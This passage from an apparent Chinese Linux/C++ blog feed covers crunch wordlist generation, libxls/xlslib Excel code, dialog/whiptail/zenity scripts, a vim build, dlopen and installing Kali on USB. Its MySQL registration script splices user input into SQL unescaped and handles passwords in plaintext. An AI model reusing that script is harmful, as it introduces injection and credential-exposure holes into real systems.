-p i love you输出:iloveyouiyouloveloveiyouloveyouiyouiloveyoulovei可看到,该参数吧一个词看做整体来进行匹配 example6 $ crunch 3 3 abc -o START -c 10 -z bzip2最后会生成3个.bz2压缩文件aaa-baa.txt.bz2bab-cab.txt.bz2cac-ccc.txt.bz2 这里使用参数 -o START, -c 表示生成的字典文件每个10行数据,直到生成结束,加入 -z bzip2 表示然后再把这些 .txt文件压缩成后缀为 .bz2的压缩包 注意,这里没有必要再指定生成字典的文件名! 结尾关于crunch的例子,可以查看文档,文档是个好东西~熟悉crunch的使用,还是很重要的…… bye~]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux libxls和xlslib读写Excel文档]]></title>
    <url>%2Flinux-xls%2F</url>
    <content type="text"><![CDATA[这里要讨论的是两款开源库 libxls 和 xlslib,前者用与 读 Excel,后者用于 写 .所以可以在Linux或Windows上使用 libxls(读Excel获取libxls可以在 官网 获取源代码, 目前最新版为 1.4.0 unzip libxls-1.4.0.zipcd libxls./configuremakemake install 注意默认安装到 /usr/local 目录下,所以需要自己手动复制相关文件到系统目录下 cp -r /usr/local/libxls/include/* /usr/includecp -r /usr/local/libxls/lib/* /usr 至此基本上可以了 例子test.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;xls.h&gt;using namespace std;using namespace xls;int main(int argc,char *argv[]) &#123; //版本信息 cout&lt;&lt;"version:"&lt;&lt;xls::xls_getVersion()&lt;&lt;endl; xlsWorkBook *pwb; xlsWorkSheet *pws; //打开一个excel表格 pwb=xls_open("test.xls","UTF-8"); if(!pwb)&#123; cout&lt;&lt;"open failed!"&lt;&lt;endl; exit(EXIT_SUCCESS); &#125; xlsSummaryInfo *summaryInfo=xls_summaryInfo(pwb); if(summaryInfo)&#123; if(summaryInfo-&gt;title)cout&lt;&lt;"title:"&lt;&lt;summaryInfo-&gt;title&lt;&lt;endl; if(summaryInfo-&gt;manager)cout&lt;&lt;"manager:"&lt;&lt;summaryInfo-&gt;manager&lt;&lt;endl; if(summaryInfo-&gt;lastAuthor)cout&lt;&lt;"lastAuthor:"&lt;&lt;summaryInfo-&gt;lastAuthor&lt;&lt;endl; if(summaryInfo-&gt;keywords)cout&lt;&lt;"keywords:"&lt;&lt;summaryInfo-&gt;keywords&lt;&lt;endl; if(summaryInfo-&gt;company)cout&lt;&lt;"company:"&lt;&lt;summaryInfo-&gt;company&lt;&lt;endl; if(summaryInfo-&gt;comment)cout&lt;&lt;"comment:"&lt;&lt;summaryInfo-&gt;comment&lt;&lt;endl; if(summaryInfo-&gt;appName)cout&lt;&lt;"appName:"&lt;&lt;summaryInfo-&gt;appName&lt;&lt;endl; if(summaryInfo-&gt;subject)cout&lt;&lt;"subject:"&lt;&lt;summaryInfo-&gt;subject&lt;&lt;endl; &#125; cout&lt;&lt;"charset:"&lt;&lt;pwb-&gt;charset&lt;&lt;endl; cout&lt;&lt;"font name:"&lt;&lt;pwb-&gt;fonts.font-&gt;name&lt;&lt;endl; cout&lt;&lt;"font bold:"&lt;&lt;pwb-&gt;fonts.font-&gt;bold&lt;&lt;endl; cout&lt;&lt;"当前表名:"&lt;&lt;pwb-&gt;sheets.sheet-&gt;name&lt;&lt;endl; cout&lt;&lt;"总表数:"&lt;&lt;pwb-&gt;sheets.count&lt;&lt;endl&lt;&lt;endl; //获取第一张表单 索引从0开始 pws= xls_getWorkSheet(pwb,0); //开始解析表单 xls_parseWorkSheet(pws); cout&lt;&lt;"行数:"&lt;&lt;pws-&gt;rows.lastrow+1&lt;&lt;endl; cout&lt;&lt;"列数:"&lt;&lt;pws-&gt;rows.lastcol&lt;&lt;endl; //遍历 for (int i = 0; i &lt; pws-&gt;rows.lastrow+1; ++i) &#123; //xlsRow = st_row::st_row_data //获取每一行的数据 st_row::st_row_data row= pws-&gt;rows.row[i]; for (int j = 0; j &lt; pws-&gt;rows.lastcol; ++j) &#123; if(row.cells.cell[j].str) &#123; cout &lt;&lt; (char*)row.cells.cell[j].str &lt;&lt; "\t"; &#125; &#125; cout&lt;&lt;endl; &#125; //关闭 xls_close_WS(pws); xls_close_WB(pwb); return 0;&#125; 注意,由于我使用 clion 编写代码,所以在链接库时在 CMakeLists.txt 最后一行添加 target_link_libraries(libxls_read libxlsreader.so) 其中 libxls_read 为项目名.或者直接 g++ test.cpp -o libxls_read -lxlsreader 测试:假设有一个Excel文件 执行程序输出 version:1.4.0标题:我是标题keywords:我是关键字comment:这是一个测试subject:我是主题charset:UTF-8font name:文泉驿正黑font bold:400当前表名:第一张表单总表数:1 行数:4列数:5刘备 关羽 张飞 曹操 刘禅曹丕 赵云 孙权 黄盖 曹植貂蝉 张角 孔明 周瑜 小乔马超 xlslib(写Excel获取xlslib可以从 http://sourceforge.net/projects/xlslib/ 获取 xlslib并编译安装,同样的默认也是安装到 /usr/local/include ,需手动复制到系统目录下 cp -r /usr/local/include/xlslib /usr/include/ 例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;xlslib/xlslib.h&gt;using namespace xlslib_core;using namespace std;int main() &#123; workbook wb; string label; printf("Version: %s\n",wb.version()); //设置字体 font_t *t=wb.font("Ubuntu"); t-&gt;SetColor(CLR_RED); t-&gt;SetItalic(true); t-&gt;SetHeight(20*15); // t-&gt;SetBoldStyle(BOLDNESS_BOLD); xf_t *xf= wb.xformat(); xf-&gt;SetFillBGColor(CLR_GREEN); xf-&gt;SetFillFGColor(CLR_RED); xf-&gt;SetFont(t); //第一张表单 worksheet *ws=wb.sheet("one"); //第二张表单 worksheet* ws2=wb.sheet("two"); ws-&gt;MakeActive(); //设置列宽度,行高度 ws-&gt;defaultColwidth(15); ws-&gt;defaultRowHeight(25); //6行 for (int i = 0; i &lt; 6; ++i) &#123; //6列 for (int j = 0; j &lt;6 ; ++j) &#123; char buf[20]=&#123;0&#125;; sprintf(buf,"%d",i*j); label=buf; // 写入 cell_t * cell= ws-&gt;label(i,j,label,xf); //或者 ws-&gt;number(i,j,i*j,xf); //设置字体阴影 cell-&gt;fontshadow(true); //设置单元格文本对齐 cell-&gt;halign(HALIGN_CENTER); cell-&gt;valign(VALIGN_CENTER); //设置行高度 ws-&gt;rowheight(i,20*15); &#125; &#125; range *ran=ws-&gt;rangegroup(1,1,1,1); ran-&gt;cellcolor(CLR_GREEN); //保存到excel文件 wb.Dump("mynew.xls"); return 0;&#125;]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Shell窗口化]]></title>
    <url>%2Flinux-shell-window%2F</url>
    <content type="text"><![CDATA[前段时间在学习Linux shell编程时,发现了几个比较好玩的工具,这里给大家分享一下…(Just for fun!) 以下三个关于创建窗口部件的包,一般应用在没有窗口界面的脚本(Script)中 1.Dialog安装方法: apt-get install dialog help: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960cdialog (ComeOn Dialog!) version 1.3-20171209Copyright 2000-2016,2017 Thomas E. DickeyThis is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.* Display dialog boxes from shell scripts *Usage: dialog &lt;options&gt; &#123; --and-widget &lt;options&gt; &#125;where options are &quot;common&quot; options, followed by &quot;box&quot; optionsSpecial options: [--create-rc &quot;file&quot;]Common options: [--ascii-lines] [--aspect &lt;ratio&gt;] [--backtitle &lt;backtitle&gt;] [--beep] [--beep-after] [--begin &lt;y&gt; &lt;x&gt;] [--cancel-label &lt;str&gt;] [--clear] [--colors] [--column-separator &lt;str&gt;] [--cr-wrap] [--date-format &lt;str&gt;] [--default-button &lt;str&gt;] [--default-item &lt;str&gt;] [--defaultno] [--exit-label &lt;str&gt;] [--extra-button] [--extra-label &lt;str&gt;] [--help-button] [--help-label &lt;str&gt;] [--help-status] [--help-tags] [--hfile &lt;str&gt;] [--hline &lt;str&gt;] [--ignore] [--input-fd &lt;fd&gt;] [--insecure] [--item-help] [--keep-tite] [--keep-window] [--last-key] [--max-input &lt;n&gt;] [--no-cancel] [--no-collapse] [--no-cr-wrap] [--no-items] [--no-kill] [--no-label &lt;str&gt;] [--no-lines] [--no-mouse] [--no-nl-expand] [--no-ok] [--no-shadow] [--no-tags] [--nook] [--ok-label &lt;str&gt;] [--output-fd &lt;fd&gt;] [--output-separator &lt;str&gt;] [--print-maxsize] [--print-size] [--print-version] [--quoted] [--reorder] [--scrollbar] [--separate-output] [--separate-widget &lt;str&gt;] [--shadow] [--single-quoted] [--size-err] [--sleep &lt;secs&gt;] [--stderr] [--stdout] [--tab-correct] [--tab-len &lt;n&gt;] [--time-format &lt;str&gt;] [--timeout &lt;secs&gt;] [--title &lt;title&gt;] [--trace &lt;file&gt;] [--trim] [--version] [--visit-items] [--week-start &lt;str&gt;] [--yes-label &lt;str&gt;]Box options: --buildlist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list-height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;... --calendar &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;day&gt; &lt;month&gt; &lt;year&gt; --checklist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;... --dselect &lt;directory&gt; &lt;height&gt; &lt;width&gt; --editbox &lt;file&gt; &lt;height&gt; &lt;width&gt; --form &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt;... --fselect &lt;filepath&gt; &lt;height&gt; &lt;width&gt; --gauge &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;percent&gt;] --infobox &lt;text&gt; &lt;height&gt; &lt;width&gt; --inputbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;init&gt;] --inputmenu &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;menu height&gt; &lt;tag1&gt; &lt;item1&gt;... --menu &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;menu height&gt; &lt;tag1&gt; &lt;item1&gt;... --mixedform &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt; &lt;itype&gt;... --mixedgauge &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;percent&gt; &lt;tag1&gt; &lt;item1&gt;... --msgbox &lt;text&gt; &lt;height&gt; &lt;width&gt; --passwordbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;init&gt;] --passwordform &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt;... --pause &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;seconds&gt; --prgbox &lt;text&gt; &lt;command&gt; &lt;height&gt; &lt;width&gt; --programbox &lt;text&gt; &lt;height&gt; &lt;width&gt; --progressbox &lt;text&gt; &lt;height&gt; &lt;width&gt; --radiolist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;... --rangebox &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;min-value&gt; &lt;max-value&gt; &lt;default-value&gt; --tailbox &lt;file&gt; &lt;height&gt; &lt;width&gt; --tailboxbg &lt;file&gt; &lt;height&gt; &lt;width&gt; --textbox &lt;file&gt; &lt;height&gt; &lt;width&gt; --timebox &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;hour&gt; &lt;minute&gt; &lt;second&gt; --treeview &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list-height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt; &lt;depth1&gt;... --yesno &lt;text&gt; &lt;height&gt; &lt;width&gt;Auto-size with height and width = 0. Maximize with height and width = -1.Global-auto-size if also menu_height/list_height = 0. dialog 命令选项(option) –add-widget 继续下个对话框,直到按下Esc或Cancel按钮–aspect ratio 指定窗口宽度和高度的宽高比–backtitle title 指定显示在屏幕顶部背景上的标题–begin x y 指定窗口左上角的起始位置–cancel-label label 指定Cancel按钮的替代标签–clear 用默认的对话背景色来清空屏幕内容–colors 在对话文本中嵌入ANSI色彩编码–cr-wrap 在对话文本中允许使用换行符并强制换行–create-rc file 将示例配置文件的内容复制到指定的file文件中 1–defaultno 将yes/no对话框的默认答案设为No–default-item string 设定复选列表、表单或菜单对话中的默认项–exit-label label 指定Exit按钮的替代标签–extra-button 在OK按钮和Cancel按钮之间显示一个额外按钮–extra-label label 指定额外按钮的替代标签–help 显示dialog命令的帮助信息–help-button 在OK按钮和Cancel按钮后显示一个Help按钮–help-label label 指定Help按钮的替代标签–help-status 当选定Help按钮后,在帮助信息后写入多选列表、单选列表或表单信息–ignore 忽略dialog不能识别的选项–input-fd fd 指定 STDIN 之外的另一个文件描述符–insecure 在password部件中键入内容时显示星号–item-help 为多选列表、单选列表或菜单中的每个标号在屏幕的底部添加一个帮助栏–keep-window 不要清除屏幕上显示过的部件–max-input size 指定输入的最大字符串长度。默认为2048–nocancel 隐藏Cancel按钮–no-collapse 不要将对话文本中的制表符转换成空格–no-kill 将tailboxbg对话放到后台,并禁止该进程的 SIGHUP 信号–no-label label 为No按钮指定替代标签–no-shadow 不要显示对话窗口的阴影效果–ok-label label 指定OK按钮的替代标签 注意: dialog 默认是重定向到标准错误(stderr).不过可以改变输出到标准输出 –stdout .这样用脚本也就能很快获取返回的文本了 例子 $ dialog –timeout 5 –stdout –menu ‘Choose a job: ‘ 30 10 25 ‘Programmer’ 1 ‘Teacher’ 2 ‘Worker’ 3 example.sh 12345678910#!/bin/bashname=$(dialog --max-input 5 --timeout 5 --inputbox 'Please enter your name: ' 10 10 'root' --stdout)job=$(dialog --timeout 5 --stdout --menu 'Choose a job: ' 30 10 25 'Programmer' 1 'Teacher' 2 'Worker' 3)clearif [ -n "$name" ];then echo "Your name is: [$name]"else #do something...fiecho -e "You are a :"$job"\t:)" 2.whiptail对比dialog,这个工具参数就少了一点,功能也就少了点,但基本的还是要有的 There are visual differences which are not addressed by command-line options: dialog centers lists within the window. whiptail typically puts lists againstthe left margin. whiptail uses angle brackets (“&lt;” and “&gt;”) for marking buttons. dialog usessquare brackets. whiptail marks the limits of subtitles with vertical bars. dialog does notmark the limits. whiptail attempts to mark the top/bottom cells of a scrollbar with up/down ar‐rows. When it cannot do this, it fills those cells with the background colorof the scrollbar and confusing the user. dialog uses the entire scrollbarspace, thereby getting better resolution. 注意Most whiptail scripts write tostandard error, but error messages may also be written there, depend‐ing on your script. help 12345678910111213141516171819202122232425262728293031Box options: --msgbox &lt;text&gt; &lt;height&gt; &lt;width&gt; --yesno &lt;text&gt; &lt;height&gt; &lt;width&gt; --infobox &lt;text&gt; &lt;height&gt; &lt;width&gt; --inputbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] --passwordbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] --textbox &lt;file&gt; &lt;height&gt; &lt;width&gt; --menu &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item] ... --checklist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]... --radiolist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]... --gauge &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;percent&gt;Options: (depend on box-option) --clear clear screen on exit --defaultno default no button --default-item &lt;string&gt; set default string --fb, --fullbuttons use full buttons --nocancel no cancel button --yes-button &lt;text&gt; set text of yes button --no-button &lt;text&gt; set text of no button --ok-button &lt;text&gt; set text of ok button --cancel-button &lt;text&gt; set text of cancel button --noitem don&apos;t display items --notags don&apos;t display tags --separate-output output one line at a time --output-fd &lt;fd&gt; output to fd, not stdout --title &lt;title&gt; display title --backtitle &lt;backtitle&gt; display backtitle --scrolltext force vertical scrollbars --topleft put window in top-left corner -h, --help print this message -v, --version print version information 例子 $ whiptail –title ‘Message’ –msgbox ‘Hi man~’ 10 20 –ok-button ‘OK’$ whiptail –title ‘Login’ –output-fd 1 –inputbox ‘Please enter username: ‘ 10 20 ‘root’ 1234567891011121314151617181920212223242526272829#!/bin/bashecho "" &gt; .tmp_usernameecho "" &gt; .tmp_passphrasusername=$(whiptail --title 'Login' --inputbox 'Please enter username: ' 10 20 'root' 1&gt;&amp;2 2&gt;.tmp_username)if [ "$?" -eq 0 ];then username=$(cat .tmp_username) if [[ -n $username ]];then echo "==&gt;"$username else echo 'Null Username!' fielse echo "ERROR=&gt; "$? exitfipassphras=$(whiptail --title 'Login' --passwordbox 'Please enter password: ' 10 20 1&gt;&amp;2 2&gt;.tmp_passphras)if [ "$?" -eq 0 ];then passphras=$(cat .tmp_passphras) if [[ -n $passphras ]];then echo "==&gt;"$passphras else echo 'Null Passphras!' fielse echo "ERROR=&gt; "$? exitfirm .tmp_usernamerm .tmp_passphras 3.Zenity适用于 GNOME环境 的图形化界面包 1234567891011121314151617181920212223242526272829303132333435363738394041zenity --help用法： zenity [OPTION…]帮助选项： -h, --help 显示帮助选项 --help-all 显示全部帮助选项 --help-general 显示常规选项 --help-calendar 显示日历选项 --help-entry 显示文字输入选项 --help-error 显示错误选项 --help-info 显示信息选项 --help-file-selection 显示文件选择选项 --help-list 显示列表选项 --help-notification 显示通知图标选项 --help-progress 显示进度选项 --help-question 显示问题选项 --help-warning 显示警告选项 --help-scale 显示范围选项 --help-text-info 显示文本信息选项 --help-color-selection 显示颜色选择选项 --help-password 显示口令对话框选项 --help-forms 显示表单对话框选项 --help-misc 显示杂类选项 --help-gtk 显示 GTK+ 选项应用程序选项： --calendar 显示日历对话框 --entry 显示文本输入对话框 --error 显示错误对话框 --info 显示信息对话框 --file-selection 显示文件选择对话框 --list 显示列表对话框 --notification 显示通知 --progress 显示进度指示对话框 --question 显示问题对话框 --warning 显示警告对话框 --scale 显示范围对话框 --text-info 显示文本信息对话框 --color-selection 显示颜色选择对话框 --password 显示口令对话框 --forms 显示表单对话框 --display=DISPLAY X display to use $ zenity –help-info用法：zenity [OPTION…] 信息选项–info 显示信息对话框–text=文字 设置对话框文字–icon-name=图标名 设置对话框图标–no-wrap 不启用文本自动换行–no-markup 不启用 pango 标记–ellipsize 在对话框文本中启用简略显示。这可以修复带有长文本的窗口的尺寸过大。 更多信息 man $ zenity –info –text=’Hello World’ –title=’Messge’ –width=30 –height=30 –timeout=3$ find . -name ‘’ | zenity –progress –pulsate$ find . -name ‘’ | zenity –list –title “Search Results” –text “Finding all header files..” –column “Files” 结尾现在，给出一个例子来实现MySQL数据库插入数据，用到了 dialog 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/bin/bashexit_code=0is_reg_ok=0trap "echo;echo Have fun!;" EXIT# get datetimeget_datenow()&#123; local now=$(date +'%Y-%m-%d %H:%M:%S') echo $now&#125;# start MYSQL serverstart_MYSQL_server()&#123; echo 'Starting MYSQL Server...' service mysql start echo 'MHSQL Started!'&#125;# showed user information when registered successfullyshow_user_info()&#123; if [[ $is_reg_ok -eq 1 ]];then echo #shift echo -e "UserName: [ \033[1;33m$1\033[0m ]" echo -e "PassWord: [ \033[1;33m$2\033[0m ]" echo -e "ID Name: [ \033[1;33m$3\033[0m ]" echo -e "Register Date: [ \033[1;33m$4\033[0m ]" echo fi&#125;############################################## this is a bash script that # quickly inset user data to mysql server database#############################################echoecho -e "Welcome to here ,you can register the account quickly...so let 's go!'"echoread -p 'Your username: ' -t 8 -r reg_userif [ -z $reg_user ];then echo;echo 'Empty!'; exit;firead -p 'Your password: ' -t 8 -r reg_passif [ -z $reg_pass ];then echo;echo 'Empty!'; exit;firead -p 'Your password[confirm]: ' -s -t 8 -r reg_pass_confirmif [ -z $reg_pass_confirm ];then echo;echo 'Password not same!'; exit;fiechoread -p 'Your ID name: ' -t 8 -r reg_idnameif [ -z $reg_idname ];then echo;echo 'Empty!'; exit;fistart_MYSQL_server# here append a --stdout instead of default --stderr,so we can get the result....username=$(dialog --max-input 8 --timeout 8 --inputbox 'Please enter MYSQL username: ' 10 10 'root' --stdout)exit_code=$?password=$(dialog --max-input 15 --timeout 8 --passwordbox 'Please enter MYSQL password: ' 10 10 --stdout)clear# check the username is emptyif [ "$exit_code" -eq 0 ];then if [ -z "$username" ] ;then echo -e "\033[1;31mNot Empty Username!\033[0m" exit fielse exitfimysql_string="mysql -u$&#123;username&#125; -p$&#123;password&#125;" now_string=$(get_datenow)# register ==&gt; insert data to mysql$&#123;mysql_string&#125; --execute="INSERT INTO db_info.tb_users (username,password,idname,reg_datetime) values ('$&#123;reg_user&#125;','$&#123;reg_pass_confirm&#125;','$&#123;reg_idname&#125;','$&#123;now_string&#125;');"if [ "$?" -eq 0 ];then echo -e "\033[1;32mRegister successfully!\033[0m" let is_reg_ok=1 show_user_info $reg_user $reg_pass_confirm $reg_idname $now_string exit 0else echo -e "\033[1;31mRegister failed!\033[0m" exit 1fi]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim支持Python2/Python3]]></title>
    <url>%2Fvim-support-python%2F</url>
    <content type="text"><![CDATA[Archlinux安装vim是默认应该是支持Python2和Python3的，而Ubuntu等若直接安装vim则只支持Python3。那么这样的话vim就无法使用YCM插件了，因此本文介绍从源代码安装vim支持以Python2和Python3。 查看vim是否支持Python用如下命令： 1vim --version 若显示一下，则表示默认不支持。 12-python/dyn+python3/dyn 编译vim源代码，安装vim1234567891011121314151617git clone https://github.com/vim/vim.gitcd vimsudo apt-get install libncurses5-dev python-dev python3-dev./configure --with-features=huge \-enable-rubyinterp \-enable-pythoninterp \-enable-python3interp \--enable-luainterp \--enable-perlinterp \--enable-multibyte \--enable-cscope \--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu/ \--with-python3-config-dir=/usr/lib/python3.7/config-3.7m-x86_64-linux-gnu/makesudo make install 其中 --with-python-config-dir 和 --with-python3-config-dir 视自己Python目录而定。 再次查看vim版本就发现支持Python了！]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux dlopen 加载动态链接库]]></title>
    <url>%2Flinux-dlopen%2F</url>
    <content type="text"><![CDATA[前言说到加载库,第一个方法就是包含库的头文件,在编译时通过 加载链接库.第二种方法在运行时用函数来加载链接库,获取其中的函数地址并调用.本文讲述后者 正文接触过WindowsAPI的应该知道,静态库后缀为,动态链接库后缀,而主要用到函数 123HMODULE WINAPI LoadLibrary( _In_ LPCTSTR lpFileName); 获取函数地址则是 1234FARPROC WINAPI GetProcAddress( _In_ HMODULE hModule, _In_ LPCSTR lpProcName); MSDN上的例子 123456789101112131415161718//声明函数指针typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise. PGNSI pGNSI; SYSTEM_INFO si; ZeroMemory(&amp;si, sizeof(SYSTEM_INFO)); pGNSI = (PGNSI) GetProcAddress( GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo"); if(NULL != pGNSI) &#123; pGNSI(&amp;si); &#125; else &#123; GetSystemInfo(&amp;si); &#125; 由此可看,Windows也实现了对库文件的调用,那么Linux下怎么调用呢?关于Linux调用库的头文件可以参考 https://linux.die.net/man/3/dlopen 必须包含的头文件 dlfcn.h常用函数: 12345678//加载链接库void *dlopen(const char *filename, int flag);//返回获取的错误char *dlerror(void);//获取链接库函数地址void *dlsym(void *handle, const char *symbol);//卸载链接库int dlclose(void *handle); 注意,在编译时,要指明 -ldl 除此之外,还有连个也比较有用的函数dladdr() dlvsym() 1234567891011121314151617//获取函数的信息//dladdr() returns 0 on error, and nonzero on success//If no symbol matching addr could be found, then dli_sname and dli_saddr are set to NULLint dladdr(void *addr, Dl_info *info);The function dladdr() takes a function pointer and tries to resolve name and file where it is located. Information is stored in the Dl_info structure:typedef struct &#123; const char *dli_fname; /* Pathname of shared object that contains address */ void *dli_fbase; /* Address at which shared object is loaded */ const char *dli_sname; /* Name of nearest symbol with address lower than addr */ void *dli_saddr; /* Exact address of symbol named in dli_sname */&#125; Dl_info;//类似dlsym()void *dlvsym(void *handle, char *symbol, char *version); 下面以一个简单的例子说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt; //包含的头文件#include &lt;string.h&gt;#define LIB_PATH "./libtest.so"//声明函数指针typedef int (*PFUN)(int ,int );int main()&#123; PFUN pf=NULL; //加载链接库 void *handle=dlopen(LIB_PATH,RTLD_LAZY); if(handle==NULL)&#123; printf("load library failed!\n"); return -1; &#125; //dlvsym(handle,"add","1.0.0"); //获取链接库里函数地址 //方法1,参考网站上的写法 //*(void**)(&amp;pf)=dlsym(handle,"add"); //方法2,相当与Windows下的 GetProcAddress() 函数. pf=(PFUN)dlsym(handle,"sub"); if(pf!=NULL)&#123; //获取函数地址信息 Dl_info info; int r= dladdr((void*)pf,&amp;info); printf("library filepath:%s\n"\ "address1:0x%08x\n"\ "funciton name:%s\n"\ "address2:0x%08x\n\n", info.dli_fname,info.dli_fbase, info.dli_sname,info.dli_saddr); //0 表示失败 if(r==0)&#123; printf("can not get the dl info...\n"); &#125; printf("get the function address...\n"); //调用函数 printf("result: %d \n",pf(50,15)); &#125;else&#123; printf("can not get the function address...\n"); &#125; //卸载链接库 dlclose(handle); return 0;&#125; 生成:g++ test.cpp -o out_test -ldl -rdynamic运行./out_test输出结果如下 123456library filepath:./libtest.soaddress1:0xeabfa000funciton name:subaddress2:0xeabfa7f4get the function address...result: 35 注意上面的库文件libtest.so在当前程序目录下的,代码如下 1234567891011121314#ifndef _TEST_H#define _TEST_H#include&lt;iostream&gt;using namespace std;extern "C" int add(int a,int b)&#123; return a+b;&#125;extern "C" int sub(int a,int b)&#123; return a-b;&#125;extern "C" int maxnum(int a,int b)&#123; return a&gt;b?a:b;&#125;#endif 然后 g++ -fPIC -shared test.cpp -o libtest.so即可生成动态链接库]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Linux系统到U盘]]></title>
    <url>%2Finstalled-system-to-usb%2F</url>
    <content type="text"><![CDATA[有时我们想让一个系统随时随地切换到另一台机器上，实现便携式系统。即通过一个U盘启动切换要启动的系统。本文以一个Linux系统安装到U盘为例简单介绍。 准备条件 Linux ISO镜像文件： Kali Linux Light 64 Bit (2018.2) 865MVirtualBox虚拟机： https://www.virtualbox.org/wiki/DownloadsU盘： Kingston Datatraveler USB(2.0) / SanDisk Ultra USB 3.0 推荐30GB以上 注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文 注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文 支持USB3.0默认virtual box只支持USB1.0/2.0，要想让他支持USB3.0，需要到 官网 下载拓展包（Extension Pack） 注意，要下载对应VirtualBox版本的 Extension Pack，当前我使用的版本是5.2.8。另外我的U盘是USB2.0的 安装在启动虚拟机前，需要插入U盘。用 lsblk 可看到该设备为sdb sdb 8:16 1 7.2G 0 disk└─sdb1 8:17 1 7.2G 0 part /media/root/3c6de664-902f-4f45-b588-f295e7c42666 要让VirtualBox能够访问到USB设备，还需要执行以下命令 1vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk /dev/sdb 其中 /dev/sdb 对于USB的设备文件名称这会在当前目录创建一个 usb.vmdk 文件 接着启动虚拟机，任意新建一个虚拟电脑，默认下一步，直至创建成功 【设置】-&gt;【存储】底盘为Linux ISO文件，同时添加一个虚拟盘（使用现有的虚拟盘），并选择刚才创建好的usb.vmdk文件 启动该虚拟机 到了磁盘分区要注意，我们要选择 sdb，即要将Linux系统安装到的U盘设备 之后就是漫长等待… 安装完成之后，重启虚拟机，同时按 F11 ，即可进入系统启动项选择。 解决中文乱码登录之后发现系统显示中文乱码！ 12echo $LANG输出 zh_CN.UTF-8 先修改更新源，编辑 /etc/apt/sources.list 文件，添加以下内容 12deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 在终端下输入 apt-get upgrade 更新系统 输入 dpkg-reconfigure locales 之后选中en_US.UTF-8和zh_CN.UTF-8，确定后，将zh_CN.UTF-8选为默认 安装中文字体 1apt-get install xfonts-wqy xfonts-intl-chinese 重启 结尾这样就完成了一个便携式U盘系统了～]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C/C++正则表达式regex]]></title>
    <url>%2Fcpp-regex%2F</url>
